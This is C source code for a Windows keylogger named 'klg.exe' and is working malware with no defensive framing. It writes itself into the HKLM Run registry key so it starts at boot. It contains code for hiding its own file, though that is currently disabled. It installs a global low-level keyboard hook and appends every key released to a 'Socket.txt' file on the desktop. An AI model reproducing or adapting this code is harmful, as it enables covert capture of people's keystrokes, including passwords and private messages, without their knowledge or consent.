#define _CRT_SECURE_NO_WARNINGS
#include <Windows.h>
#include <shlobj.h>

/*extern "C" const DWORD_PTR __security_cookie = 0xE64EBB40;

extern "C" void __fastcall __security_check_cookie(DWORD_PTR cookie)
{
    if (cookie != __security_cookie)
        __asm int 3;
}*/

#pragma optimize("gsy", on)

//DWORD hidden = FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_SYSTEM;
DWORD hidden = NULL;
wchar_t loc[256];
wchar_t log[256];
HANDLE hf;
WORD key;
HKEY pKey;
DWORD regDisposition;
wchar_t * ukey;
int d;
DWORD bytes;
byte b[256];
LRESULT CALLBACK LowLevelKeyboardProc( int nCode, WPARAM wParam, LPARAM lParam );
//int __cdecl WinMainCRTStartup()
int _stdcall WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPSTR lpCmdLine,int nCmdShow)
{
	loc[0]='"';
	ukey = (wchar_t *) HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,20);
	if(GetCurrentDirectory(256,&loc[1]))
	{
		RegCreateKeyEx(HKEY_LOCAL_MACHINE,L"Software\\\\Wow6432Node\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run",NULL,NULL,REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,NULL,&pKey,&regDisposition);
		wcscat(loc,L"\\klg.exe\"");
		RegSetValueEx(pKey,L"klg",NULL,REG_SZ,(const BYTE *)loc,256);
	}
	if(SUCCEEDED(SHGetFolderPath(NULL,CSIDL_DESKTOP,NULL,0,log))) 
    wcscat(log, L"\\Socket.txt");
	SetFileAttributes(L"klg.exe",hidden);
	HINSTANCE appInstance = GetModuleHandle(NULL);
	HWND focus = GetFocus();
	SetWindowsHookEx( WH_KEYBOARD_LL, LowLevelKeyboardProc, appInstance, 0 );
	MSG msg;
	while(GetMessage(&msg, NULL, 0, 0) > 0)
	{
			TranslateMessage(&msg);
			DispatchMessage(&msg);
	}
 
return 0;
}
LRESULT CALLBACK LowLevelKeyboardProc( int nCode, WPARAM wParam, LPARAM lParam )
{
	KBDLLHOOKSTRUCT *pKeyBoard = (KBDLLHOOKSTRUCT *)lParam;
	switch( wParam )
	{
	case WM_KEYUP:
		{
			if(ToUnicode(pKeyBoard->vkCode,pKeyBoard->scanCode,b,ukey,1,0)==1);
				if(pKeyBoard->vkCode==VK_BACK)
					ukey = L"[BKSP]";
			hf=CreateFile(log,GENERIC_READ | GENERIC_WRITE,NULL,NULL,OPEN_EXISTING,hidden,NULL);
			if(GetLastError()==ERROR_FILE_NOT_FOUND)
				hf=CreateFile(log,GENERIC_READ | GENERIC_WRITE,NULL,NULL,CREATE_NEW,hidden,NULL);
			bytes=SetFilePointer(hf, 0, NULL, FILE_END);
			d=WriteFile(hf,ukey,2*wcslen(ukey),&bytes,NULL);
			CloseHandle(hf);
		}
	default:
		return CallNextHookEx( NULL, nCode, wParam, lParam );
	}
	return 0;
}

